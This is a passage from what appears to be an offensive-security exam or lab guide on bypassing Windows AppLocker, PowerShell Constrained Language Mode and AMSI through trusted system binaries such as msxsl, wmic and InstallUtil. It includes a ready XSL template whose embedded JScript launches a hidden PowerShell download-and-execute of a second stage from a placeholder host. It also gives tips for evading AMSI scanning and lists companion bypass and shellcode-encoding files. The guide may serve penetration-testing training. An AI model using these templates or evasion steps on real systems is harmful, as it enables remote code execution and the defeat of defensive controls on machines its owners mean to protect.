# DLL rule set enabled? (if not, DLL path is viable)
(Get-AppLockerPolicy -Effective).RuleCollections | Select CollectionType, EnforcementMode
```

## 4. Common failures and counters

| Symptom | Cause | Counter |
|---|---|---|
| `InstallUtil` reports “not a valid Win32 application” | Bitness mismatch | Switch to the `Framework` (32-bit) directory |
| Host starts then exits immediately | Assembly missing RunInstaller attribute | See `m05-installutil-runner.cs` |
| Host fine but payload never ran | Entry signature mismatch | Reflectively list types/methods |
| Command refused by policy | Path not on the allow list | Change host or allow directory |
| wmic missing | Removed on that OS version | Switch to msxsl / InstallUtil |

## 5. Relation to other docs

- Policy enum detail: `m05-applocker-enum.ps1`
- DLL sideloading: `docs/04-dll-sideloading.md`
- Scenario flow: `docs/05-applocker-clm-amsi.md`
````

**Verify**: command returns without error; listener gets a callback; `output.xml` is created (proves the host actually ran).

**If it fails**:
1. Workflow host also blocked → try XSL (scenario 24), MSBuild, `regsvr32` (script host), `mshta` (HTA path).
2. Different .NET version directories → enumerate all `v*` under `C:\Windows\Microsoft.NET\Framework*`.
3. CLM affects PowerShell invocation → call the host via `cmd /c` directly, not through PowerShell.

**Exam notes / OPSEC**: trusted hosts win because they are “on the allow list + no custom EXE on disk”; always use full paths — never rely on PATH.

---

## Scenario 24: Normal script entry is limited, but an XSL processing path still works

**Situation**: Conventional script execution is restricted, but the matching component can still process XSL that embeds script logic, and effective policy allows calling it.

**Assumptions**:
- PowerShell/VBScript entry is limited.
- `msxsl.exe` or `wmic.exe` is available and can process XSL with embedded JScript/VBScript.

**Prepare (attacker)**: write XSL containing `<msxsl:script language="JScript">`, or use the `wmic` format execution path.

**Procedure**:
1. With `msxsl.exe` (if present):
   ```cmd
   msxsl.exe payload.xml payload.xsl
   ```
2. Or the `wmic` XSL format path:
   ```cmd
   wmic process get brief /format:"C:\Windows\Temp\payload.xsl"
   ```
3. Put payload logic in the XSL script block (download-exec / callback).

**Lab files**:
| File | Purpose | Key parameters |
|---|---|---|
| `m05-xsl-exec.xsl` | XSL script-exec template | Replace LHOST/URL |
| `m05-lolbas-notes.md` | Host invocation quick reference | — |

#### `m05-xsl-exec.xsl` {#m05-xsl-exec-xsl}

````xml
<?xml version="1.0"?>
<!--
Purpose: XSL script-exec template — trigger embedded script via msxsl.exe or wmic /format (when normal script entry is limited)
Scenario: 24 (normal script entry limited, but XSL processing path still works)
Depends: msxsl.exe (not inbox) or wmic.exe (still present on some Win10/11 builds)
Usage:
  1) msxsl:   msxsl.exe payload.xml m05-xsl-exec.xsl
  2) wmic:    wmic process get brief /format:"C:\Windows\Temp\m05-xsl-exec.xsl"
Placeholders: LHOST/LPORT (callback address), URL (second-stage address)
Test status: not runtime-tested on Windows; XML/XSL structure checked by hand
-->
<xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
                xmlns:msxsl="urn:schemas-microsoft-com:xslt"
                xmlns:user="urn:payload"
                version="1.0">

  <!-- JScript block: both wmic /format and msxsl execute it -->
  <msxsl:script language="JScript" implements-prefix="user">
  <![CDATA[
    function run() {
      try {
        var shell = new ActiveXObject("WScript.Shell");
        // Method A: PowerShell download-exec (if PowerShell is available)
        var ps = "powershell -nop -w hidden -c \"IEX (New-Object Net.WebClient).DownloadString('http://LHOST/stage2.ps1')\"";
        shell.Run(ps, 0, false);

        // Method B: direct callback validation (when PowerShell is unavailable)
        // shell.Run("cmd.exe /c curl -s http://LHOST/xsl-ran", 0, false);

        return "ok";
      } catch (e) {
        return "err:" + e.message;
      }
    }
  ]]>
  </msxsl:script>

  <xsl:template match="/">
    <output>
      <xsl:value-of select="user:run()"/>
    </output>
  </xsl:template>
</xsl:stylesheet>
````

**Verify**: command has no error; callback or marker file appears; `msxsl`/`wmic` process is actually created.

**If it fails**:
1. `msxsl.exe` missing (not installed by default) → use the `wmic` `/format` path.
2. XSL script scanned by AMSI → split/encode detected strings, or make XSL a downloader only and deliver stage two separately.
3. Policy allows `wmic` but not `/format` → switch to other trusted hosts (scenario 23).

**Exam notes / OPSEC**: `wmic` may be removed on newer systems (Win11 24H2+); confirm with `where wmic` before the exam; XSL’s advantage is that policy often ignores it.

---

## Module quick reference

| Symptom | Command / action |
|---|---|
| Enumerate effective AppLocker policy | `Get-AppLockerPolicy -Effective -Xml` |
| Check language mode | `$ExecutionContext.SessionState.LanguageMode` |
| Check Defender realtime protection | `Get-MpComputerStatus \| fl RealTimeProtectionEnabled` |
| Check whether DLL rule set is enabled | `(Get-AppLockerPolicy -Effective).RuleCollections \| ? CollectionType -eq 'Dll'` |
| Check directory write rights | `icacls <dir>`, `accesschk -w <dir>` |
| Trusted hosts | InstallUtil / Microsoft.Workflow.Compiler / msxsl / wmic / mshta / regsvr32 / MSBuild |
| Managed assembly load | `[Reflection.Assembly]::Load($bytes)` + reflective entry call |
| CLM bypass | Custom Runspace (`m05-clm-bypass-runspace.ps1`) |
| AMSI handling | `m05-amsi-bypass-variants.ps1` |

## Related lab-file list

| File | Notes |
|---|---|
| `m05-amsi-bypass-variants.ps1` | Multiple AMSI-handling variants (pick by host) |
| `m05-clm-bypass-runspace.ps1` | Custom Runspace CLM bypass |
| `m05-applocker-enum.ps1` | Enumerate effective rules and writable allow paths |
| `m05-installutil-runner.cs` | InstallUtil-compatible assembly |
| `m05-workflow-compiler-runner.cs` | Workflow host input assembly |
| `m05-xsl-exec.xsl` | XSL script-exec template |
| `m05-lolbas-notes.md` | Trusted-host quick reference |
| `m13-xor-encoder.py` | Shellcode encoding (scenario 18) |
| `m04-proxy-dll-sideload.c` | Proxy DLL (scenario 22) |
